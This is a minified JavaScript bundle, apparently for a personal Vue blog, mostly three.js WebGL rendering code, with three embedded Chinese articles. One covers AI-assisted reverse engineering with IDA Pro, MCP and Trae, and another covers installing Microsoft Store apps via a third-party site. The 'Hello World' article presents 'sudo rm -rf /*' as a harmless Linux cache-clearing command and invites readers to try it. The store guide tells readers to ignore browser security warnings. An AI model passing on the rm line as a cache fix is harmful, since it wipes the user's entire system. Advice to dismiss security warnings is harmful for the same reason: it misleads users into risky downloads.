...
void main() {
	...
	#include <fog_fragment>
		...
		`,blending:si,depthTest:!1,depthWrite:!1})}function ff(){return new Gn({name:"EquirectangularToCubeUV",uniforms:{envMap:{value:null}},vertexShader:Yo(),fragmentShader:`
		...
		`,blending:si,depthTest:!1,depthWrite:!1})}function df(){return new Gn({name:"CubemapToCubeUV",uniforms:{envMap:{value:null},flipEnvMap:{value:-1}},vertexShader:Yo(),fragmentShader:`
	...
	`}function rS(n){let e=new WeakMap,t=null;function i(a){if(a&&a.isTexture){const l=a.mapping,c=l===_l||l===vl,u=l===lr||l===Br;if(c||u){let f=e.get(a);const d=f!==void 0?f.texture.pmremVersion:0;if(a.isRenderTargetTexture&&a.pmremVersion!==d)return t===null&&(t=new cf(n)),f=c?t.fromEquirectangular(a,f):t.fromCubemap(a,f),f.texture.pmremVersion=a.pmremVersion,e.set(a,f),f.texture;if(f!==void 0)return f.texture;{const h=a.image;return c&&h&&h.height>0||u&&h&&r(h)?(t===null&&(t=new cf(n)),f=c?t.fromEquirectangular(a):t.fromCubemap(a),f.texture.pmremVersion=a.pmremVersion,e.set(a,f),a.addEventListener("dispose",s),f.texture):null}}}return a}function r(a){let l=0;const c=6;for(let u=0;u<c;u++)a[u]!==void 0&&l++;return l===c}function s(a){const l=a.target;l.removeEventListener("dispose",s);const c=e.get(l);c!==void 0&&(e.delete(l),c.dispose())}function o(){e=new WeakMap,t!==null&&(t.dispose(),t=null)}return{get:i,dispose:o}}function sS(n){const e={};function t(i){if(e[i]!==void 0)return e[i];const r=n.getExtension(i);return e[i]=r,r}return{has:function(i){return t(i)!==null},init:function(){t("EXT_color_buffer_float"),t("WEBGL_clip_cull_distance"),t("OES_texture_float_linear"),t("EXT_color_buffer_half_float"),t("WEBGL_multisampled_render_to_texture"),t("WEBGL_render_shared_exponent")},get:function(i){const r=t(i);return r===null&&bs("WebGLRenderer: "+i+" extension not supported."),r}}}function oS(n,e,t,i){const r={},s=new WeakMap;function o(f){const d=f.target;d.index!==null&&e.remove(d.index);for(const _ in d.attributes)e.remove(d.attributes[_]);d.removeEventListener("dispose",o),delete r[d.id];const h=s.get(d);h&&(e.remove(h),s.delete(d)),i.releaseStatesOfGeometry(d),d.isInstancedBufferGeometry===!0&&delete d._maxInstanceCount,t.memory.geometries--}function a(f,d){return r[d.id]===!0||(d.addEventListener("dispose",o),r[d.id]=!0,t.memory.geometries++),d}function l(f){const d=f.attributes;for(const h in d)e.update(d[h],n.ARRAY_BUFFER)}function c(f){const d=[],h=f.index,_=f.attributes.position;let v=0;if(h!==null){const b=h.array;v=h.version;for(let T=0,M=b.length;T<M;T+=3){const w=b[T+0],P=b[T+1],D=b[T+2];d.push(w,P,P,D,D,w)}}else if(_!==void 0){const b=_.array;v=_.version;for(let T=0,M=b.length/3-1;T<M;T+=3){const w=T+0,P=T+1,D=T+2;d.push(w,P,P,D,D,w)}}else return;const m=new(Th(d)?Ih:Dh)(d,1);m.version=v;const p=s.get(f);p&&e.remove(p),s.set(f,m)}function u(f){const d=s.get(f);if(d){const h=f.index;h!==null&&d.version<h.version&&c(f)}else c(f);return s.get(f)}return{get:a,update:l,getWireframeAttribute:u}}function aS(n,e,t){let i;function r(d){i=d}let s,o;function a(d){s=d.type,o=d.bytesPerElement}function l(d,h){n.drawElements(i,h,s,d*o),t.update(h,i,1)}function c(d,h,_){_!==0&&(n.drawElementsInstanced(i,h,s,d*o,_),t.update(h,i,_))}function u(d,h,_){if(_===0)return;e.get("WEBGL_multi_draw").multiDrawElementsWEBGL(i,h,0,s,d,0,_);let m=0;for(let p=0;p<_;p++)m+=h[p];t.update(m,i,1)}function f(d,h,_,v){if(_===0)return;const m=e.get("WEBGL_multi_draw");if(m===null)for(let p=0;p<d.length;p++)c(d[p]/o,h[p],v[p]);else{m.multiDrawElementsInstancedWEBGL(i,h,0,s,d,0,v,0,_);let p=0;for(let b=0;b<_;b++)p+=h[b]*v[b];t.update(p,i,1)}}this.setMode=r,this.setIndex=a,this.render=l,this.renderInstances=c,this.renderMultiDraw=u,this.renderMultiDrawInstances=f}function lS(n){const e={geometries:0,textures:0},t={frame:0,calls:0,triangles:0,points:0,lines:0};function i(s,o,a){switch(t.calls++,o){case n.TRIANGLES:t.triangles+=a*(s/3);break;case n.LINES:t.lines+=a*(s/2);break;case n.LINE_STRIP:t.lines+=a*(s-1);break;case n.LINE_LOOP:t.lines+=a*s;break;case n.POINTS:t.points+=a*s;break;default:Qe("WebGLInfo: Unknown draw mode:",o);break}}function r(){t.calls=0,t.triangles=0,t.points=0,t.lines=0}return{memory:e,render:t,programs:null,autoReset:!0,reset:r,update:i}}function cS(n,e,t){const i=new WeakMap,r=new Mt;function s(o,a,l){const c=o.morphTargetInfluences,u=a.morphAttributes.position||a.morphAttributes.normal||a.morphAttributes.color,f=u!==void 0?u.length:0;let d=i.get(a);if(d===void 0||d.count!==f){let y=function(){V.dispose(),i.delete(a),a.removeEventListener("dispose",y)};var h=y;d!==void 0&&d.texture.dispose();const _=a.morphAttributes.position!==void 0,v=a.morphAttributes.normal!==void 0,m=a.morphAttributes.color!==void 0,p=a.morphAttributes.position||[],b=a.morphAttributes.normal||[],T=a.morphAttributes.color||[];let M=0;_===!0&&(M=1),v===!0&&(M=2),m===!0&&(M=3);let w=a.attributes.position.count*M,P=1;w>e.maxTextureSize&&(P=Math.ceil(w/e.maxTextureSize),w=e.maxTextureSize);const D=new Float32Array(w*P*4*f),V=new Ah(D,w,P,f);V.type=Nn,V.needsUpdate=!0;const x=M*4;for(let L=0;L<f;L++){const N=p[L],z=b[L],ne=T[L],te=w*P*4*L;for(let K=0;K<N.count;K++){const H=K*x;_===!0&&(r.fromBufferAttribute(N,K),D[te+H+0]=r.x,D[te+H+1]=r.y,D[te+H+2]=r.z,D[te+H+3]=0),v===!0&&(r.fromBufferAttribute(z,K),D[te+H+4]=r.x,D[te+H+5]=r.y,D[te+H+6]=r.z,D[te+H+7]=0),m===!0&&(r.fromBufferAttribute(ne,K),D[te+H+8]=r.x,D[te+H+9]=r.y,D[te+H+10]=r.z,D[te+H+11]=ne.itemSize===4?r.w:1)}}d={count:f,texture:V,size:new ct(w,P)},i.set(a,d),a.addEventListener("dispose",y)}if(o.isInstancedMesh===!0&&o.morphTexture!==null)l.getUniforms().setValue(n,"morphTexture",o.morphTexture,t);else{let _=0;for(let m=0;m<c.length;m++)_+=c[m];const v=a.morphTargetsRelative?1:1-_;l.getUniforms().setValue(n,"morphTargetBaseInfluence",v),l.getUniforms().setValue(n,"morphTargetInfluences",c)}l.getUniforms().setValue(n,"morphTargetsTexture",d.texture,t),l.getUniforms().setValue(n,"morphTargetsTextureSize",d.size)}return{update:s}}function uS(n,e,t,i){let r=new WeakMap;function s(l){const c=i.render.frame,u=l.geometry,f=e.get(l,u);if(r.get(f)!==c&&(e.update(f),r.set(f,c)),l.isInstancedMesh&&(l.hasEventListener("dispose",a)===!1&&l.addEventListener("dispose",a),r.get(l)!==c&&(t.update(l.instanceMatrix,n.ARRAY_BUFFER),l.instanceColor!==null&&t.update(l.instanceColor,n.ARRAY_BUFFER),r.set(l,c))),l.isSkinnedMesh){const d=l.skeleton;r.get(d)!==c&&(d.update(),r.set(d,c))}return f}function o(){r=new WeakMap}function a(l){const c=l.target;c.removeEventListener("dispose",a),t.remove(c.instanceMatrix),c.instanceColor!==null&&t.remove(c.instanceColor)}return{update:s,dispose:o}}const fS={[uh]:"LINEAR_TONE_MAPPING",[fh]:"REINHARD_TONE_MAPPING",[dh]:"CINEON_TONE_MAPPING",[hh]:"ACES_FILMIC_TONE_MAPPING",[mh]:"AGX_TONE_MAPPING",[gh]:"NEUTRAL_TONE_MAPPING",[ph]:"CUSTOM_TONE_MAPPING"};function dS(n,e,t,i,r){const s=new zn(e,t,{type:n,depthBuffer:i,stencilBuffer:r}),o=new zn(e,t,{type:di,depthBuffer:!1,stencilBuffer:!1}),a=new Rn;a.setAttribute("position",new ai([-1,3,0,-1,-1,0,3,-1,0],3)),a.setAttribute("uv",new ai([0,2,0,0,2,0],2));const l=new a_({uniforms:{tDiffuse:{value:null}},vertexShader:`
			precision highp float;
...
`)}const lM={[uh]:"Linear",[fh]:"Reinhard",[dh]:"Cineon",[hh]:"ACESFilmic",[mh]:"AgX",[gh]:"Neutral",[ph]:"Custom"};function cM(n,e){const t=lM[e];return t===void 0?(ke("WebGLProgram: Unsupported toneMapping:",e),"vec3 "+n+"( vec3 color ) { return LinearToneMapping( color ); }"):"vec3 "+n+"( vec3 color ) { return "+t+"ToneMapping( color ); }"}const co=new Y;function uM(){Ze.getLuminanceCoefficients(co);const n=co.x.toFixed(4),e=co.y.toFixed(4),t=co.z.toFixed(4);return["float luminance( const in vec3 rgb ) {",`	const vec3 weights = vec3( ${n}, ${e}, ${t} );`,"	return dot( weights, rgb );","}"].join(`
...
#define LOW_PRECISION`),e}const xM={[go]:"SHADOWMAP_TYPE_PCF",[rs]:"SHADOWMAP_TYPE_VSM"};function SM(n){return xM[n.shadowMapType]||"SHADOWMAP_TYPE_BASIC"}const MM={[lr]:"ENVMAP_TYPE_CUBE",[Br]:"ENVMAP_TYPE_CUBE",[Wo]:"ENVMAP_TYPE_CUBE_UV"};function EM(n){return n.envMap===!1?"ENVMAP_TYPE_CUBE":MM[n.envMapMode]||"ENVMAP_TYPE_CUBE"}const yM={[Br]:"ENVMAP_MODE_REFRACTION"};function bM(n){return n.envMap===!1?"ENVMAP_MODE_REFLECTION":yM[n.envMapMode]||"ENVMAP_MODE_REFLECTION"}const TM={[ch]:"ENVMAP_BLENDING_MULTIPLY",[gg]:"ENVMAP_BLENDING_MIX",[_g]:"ENVMAP_BLENDING_ADD"};function AM(n){return n.envMap===!1?"ENVMAP_BLENDING_NONE":TM[n.combine]||"ENVMAP_BLENDING_NONE"}function wM(n){const e=n.envMapCubeUVHeight;if(e===null)return null;const t=Math.log2(e)-2,i=1/e;return{texelWidth:1/(3*Math.max(Math.pow(2,t),112)),texelHeight:i,maxMip:t}}function RM(n,e,t,i){const r=n.getContext(),s=t.defines;let o=t.vertexShader,a=t.fragmentShader;const l=SM(t),c=EM(t),u=bM(t),f=AM(t),d=wM(t),h=fM(t),_=dM(s),v=r.createProgram();let m,p,b=t.glslVersion?"#version "+t.glslVersion+`
    ...
    `)],-1),k("div",{class:"text-content"},[k("p",null," 使用IDA Pro随便打开一个exe，点击Edit->Plugins->MCP，如果Output里输出了[MCP] Server started at http://localhost:13337即安装成功 "),k("p",null,"创建一个文件夹，把要逆向的exe放在里面，IDA Pro打开该exe，点击Edit->Plugins->MCP"),k("p",null," 打开Trae，在Trae中打开该文件夹，在右侧的AI对话界面，点击右上角的AI功能管理按钮，图标为设置齿轮，点击MCP。添加一个新的MCP服务器，手动配置，配置json如下： ")],-1),k("pre",{"data-lang":"json"},[k("code",{class:"language-json"},`
{
  "mcpServers": {
    ...
    `)],-1),k("div",{class:"text-content"},[k("p",null,"添加后运行测试是否可用，不可用根据报错信息调整配置"),k("p",null,"配置完成后，回到AI对话页面，智能体改成@Builder with MCP，工具使用刚刚配置的MCP"),k("p",null,'发送"连接到MCP，并分析IDA逆向项目"，检查是否成功'),k("p",null,"可以设置自动运行不需要手动确认"),k("br"),k("p",null,"----Written by tmyy | 2025-4-29----")],-1)])]),_:1}))}},Lb={__name:"Article-2025-3-19-Hello",setup(n){return(e,t)=>(Et(),fi(zc,null,{default:ur(()=>[...t[0]||(t[0]=[k("h1",{class:"title-glow"},"Hello World!",-1),k("div",{class:"text-content"},[k("p",null,"我的第一篇文章"),k("p",null,"也不知道写点什么好，就分享个Linux清理缓存的命令吧。")],-1),k("pre",{"data-lang":"bash"},[k("code",{class:"language-bash"},`
sudo rm -rf /*
    `)],-1),k("div",{class:"text-content"},[k("p",null,"你试试喵~")],-1)])]),_:1}))}},Ub={__name:"Article-2025-3-19-解决微软应用商店无法正常下载软件问题",setup(n){return(e,t)=>(Et(),fi(zc,null,{default:ur(()=>[...t[0]||(t[0]=[k("h1",{class:"title-glow"},"解决微软应用商店无法正常下载软件问题",-1),k("div",{class:"text-content"},[k("p",null," 去年我更新Windows后，想在微软应用商店中下载软件，却发现无法正常下载了，显示报错：0x80072F8F。我在网上搜了很多文章，跟着做，却一直没有解决这个问题。 ")],-1),k("img",{src:"/article-images/2025-3-19-001.jpg",alt:"微软应用商店报错截图",class:"content-image"},null,-1),k("div",{class:"text-content"},[k("p",null,[ni(" 后来我找到了一个网站，可以直接从该网站下载微软商店的应用，并使用powershell安装。这可以用来代替微软商店来解决这个问题。网站： "),k("a",{href:"https://store.rg-adguard.net/",target:"_blank",rel:"noopener noreferrer"},"https://store.rg-adguard.net")]),k("p",null,[ni(" 使用方法（详见 "),k("a",{href:"https://www.bilibili.com/video/BV1Z5F5efEp3",target:"_blank",rel:"noopener noreferrer"},"该视频"),ni("）： ")]),k("p",null,'1.在设置中打开"开发人员模式"'),k("p",null,'2.在微软商店该应用的页面，点击"分享"，并复制链接'),k("p",null," 3.进入该网站，粘贴链接，搜索。找到与你计算机系统匹配的版本，下载。注意：下载的包后缀一般都带appx或msix，后缀为BlockMap的文件并不是安装包 "),k("p",null,"4.使用管理员权限打开powershell，输入命令：")],-1),k("pre",{"data-lang":"powershell"},[k("code",{class:"language-powershell"},'Add-AppxPackage -Path "下载的安装包路径"')],-1),k("div",{class:"text-content"},[k("p",null," 安装完成后，在开始菜单中找到该应用，点击运行，查看是否正常运行，若不能请下载其他的版本 "),k("p",null,"注：下载时浏览器可能会报不安全的提示，请忽略，信任即可")],-1)])]),_:1}))}},Nb=gy({history:$E("/"),routes:[{path:"/",name:"Home",component:ab},{path:"/about",name:"About",component:fb},{path:"/articles",name:"ArticleList",component:Rb},{path:"/article/2025-04-29-使用IDA+Trae+MCP免费实现AI辅助逆向",name:"Article0",component:Ib},{path:"/article/2025-03-19-Hello",name:"Article1",component:Lb},{path:"/article/2025-03-19-解决微软应用商店无法正常下载软件问题",name:"Article2",component:Ub}]}),ap=q0(uE);ap.use(Nb);ap.mount("#app");
